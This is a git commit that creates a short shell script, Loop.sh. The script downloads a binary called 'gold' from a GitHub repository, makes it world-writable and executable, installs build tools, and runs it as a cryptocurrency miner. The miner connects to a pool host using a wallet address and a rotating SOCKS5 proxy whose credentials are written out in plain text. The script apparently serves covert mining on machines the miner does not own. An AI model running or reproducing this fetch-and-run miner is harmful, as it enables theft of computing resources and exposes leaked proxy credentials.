f49565de15344974b8eaeda37467a0d2f7a5d0bf
iton466 <108810354+iton466@users.noreply.github.com>
2022-07-12 14:09:42 +0530

    Create Loop.sh

---
+++ Loop.sh
@@ -0,0 +1,5 @@
+wget https://github.com/Testdrive345/hello/raw/main/gold
+chmod 777 gold
+sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
+
+./gold -a minotaurx -o node-103-249-70-7.reverse.x4b.me:7019 -u MBsiaTaEEUNsMHFZKPmqT35Sv3rbiLLkAp -p  c=LCC,mc=LCC,ID=Test -x socks5://jvyxiovx-rotate:2udhid79wl5a@p.webshare.io:80
